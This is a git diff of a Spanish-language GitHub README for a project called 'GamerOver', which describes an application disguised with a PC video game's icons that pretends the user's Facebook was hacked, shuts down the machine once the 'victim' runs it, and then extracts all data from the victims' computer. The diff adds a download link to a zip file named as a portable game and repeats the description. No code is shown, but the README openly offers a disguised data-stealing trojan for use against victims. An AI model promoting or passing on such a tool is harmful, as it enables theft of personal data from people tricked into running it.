@@ -1,7 +1,7 @@
 # GamerOver
 GameOver es una aplicación que tiene los iconos de un video juego de pc que simula que fue hackeado  su facebook, y apaga la maquina una vez que la victima lo ejecute luego extrae todos los datos he información de la pc de nuestra victimas.
-#### Descargar 
-
+#### Descargar https://github.com/Pericena/GamerOver/blob/master/Descargar/Juego%20Portables.zip
+- GameOver es una aplicación que tiene los iconos de un video juego de pc que simula que fue hackeado  su facebook, y apaga la maquina una vez que la victima lo ejecute luego extrae todos los datos he información de la pc de nuestra victimas.
 
 ### Sigueme en las redes Sociales:
 - 🌎Blogger          https://lpericena.blogspot.com/
